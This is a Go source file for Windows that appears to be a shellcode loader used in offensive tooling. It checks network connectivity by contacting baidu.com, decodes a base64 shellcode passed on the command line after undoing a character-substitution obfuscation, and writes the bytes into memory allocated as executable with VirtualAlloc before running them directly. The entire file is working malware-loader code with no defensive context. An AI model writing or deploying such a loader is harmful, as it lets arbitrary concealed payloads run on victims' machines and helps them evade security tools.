package main

import (
	"encoding/base64"
	"net/http"
	"os"
	"strings"
	"syscall"
	"unsafe"
)

var (
	kernel32      = syscall.NewLazyDLL("kernel32.dll")
	VirtualAlloc  = kernel32.NewProc("VirtualAlloc")
	RtlMoveMemory = kernel32.NewProc("RtlMoveMemory")
)

func main() {
	resp, _ := http.Get("http://www.baidu.com")
	defer resp.Body.Close()
	if resp.StatusCode == 200 {
		if len(os.Args) == 3 {
			build(os.Args[1], []byte(os.Args[2]))
		}
	}
}

func build(shellCode string, randStr []byte) {
	newStr := strings.Replace(shellCode, "#", string(randStr[0]), -1)
	newStr = strings.Replace(newStr, "!", string(randStr[1]), -1)
	newStr = strings.Replace(newStr, "@", string(randStr[2]), -1)
	newStr = strings.Replace(newStr, ")", string(randStr[3]), -1)
	bytes, _ := base64.StdEncoding.DecodeString(newStr)
	addr, _, _ := VirtualAlloc.Call(0, uintptr(len(bytes)), 0x1000|0x2000, 0x40)
	_, _, _ = RtlMoveMemory.Call(addr, (uintptr)(unsafe.Pointer(&bytes[0])), uintptr(len(bytes)))
	_, _, _ = syscall.Syscall(addr, 0, 0, 0, 0)
}
